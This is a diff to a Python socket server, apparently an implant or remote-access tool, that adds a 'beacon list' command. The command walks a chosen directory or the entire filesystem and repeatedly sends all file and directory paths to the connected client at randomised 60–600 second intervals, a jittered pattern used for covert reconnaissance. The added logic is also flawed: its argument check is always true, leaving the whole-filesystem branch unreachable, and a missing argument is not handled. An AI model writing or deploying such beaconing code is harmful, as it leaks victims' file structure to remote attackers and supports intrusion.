@@ -71,6 +71,37 @@ def ServerStart(HOST, PORT):
 												conn.send(">Error, try again\n".encode())
 										if data.decode().split()[1] == "transfer":
 											conn.send("Not implemented\n".encode())
+								elif data.decode().split()[0] == "beacon":
+									Log_Output("---------------------------")
+									Log_Output("   ATTEMPTING BEACONING")
+									Log_Output("---------------------------")
+									if data.decode().split()[1] == "list":
+										try:
+											if data.decode().split()[2] != "\n" or data.decode().split()[2] != "":				
+												directory = data.decode().split()[2]
+												while True:
+													for root, directories, files in os.walk(directory):
+														for name in files:
+															output = os.path.join(root, name) + "\n"
+															conn.send(output.encode())
+														for name in directories:
+															output = os.path.join(root, name) + "\n"
+															conn.send(output.encode())
+													Log_Output(("Directory list for", directory, "sent to", addr))
+													time.sleep(randint(60,600))
+											else:
+												while True:
+													for root, directories, files in os.walk('/'):
+														for name in files:
+															output = os.path.join(root, name) + "\n"
+															conn.send(output.encode())
+														for name in directories:
+															output = os.path.join(root, name) + "\n"
+															conn.send(output.encode())
+													Log_Output(("Directory list sent to", addr))
+													time.sleep(randint(60,600))
+										except (ConnectionResetError):
+											Log_Output("<--- Connection closed --->")
 							# decode the data to print it
 							nodata = 0
 							# encode and reply to the data source ip
